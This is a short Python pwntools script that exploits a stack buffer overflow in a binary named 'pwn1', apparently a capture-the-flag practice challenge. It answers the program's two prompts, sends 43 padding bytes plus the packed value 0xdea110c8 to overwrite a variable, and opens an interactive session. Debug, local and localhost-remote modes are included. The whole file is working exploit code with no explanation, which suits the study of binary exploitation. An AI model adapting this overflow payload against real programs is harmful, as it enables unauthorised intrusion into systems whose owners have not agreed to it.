#!/usr/bin/env python
from pwn import *
import sys
executable="./pwn1"
if len(sys.argv) < 2:
    print("Usage: "+str(sys.argv[0]) +' <d> debug; <r> remote; <l> local')
    sys.exit(0)
if (sys.argv[1] == 'd'):
    log.info("Debug")
    target = gdb.debug(executable, ''' b *main+313
        continue
        x/x $ebp-0x10
            ''')
elif(sys.argv[1] == 'r'):
    log.info("Remote target")
    target=remote("127.0.0.1","31337")
else:
    target=process(executable)


target.recvuntil("name?")
target.recvline()
target.sendline("Sir Lancelot of Camelot")
target.recvuntil("quest?")
target.sendline("To seek the Holy Grail.")
target.sendline(b"A"*43 + p32(0xdea110c8))
target.interactive()
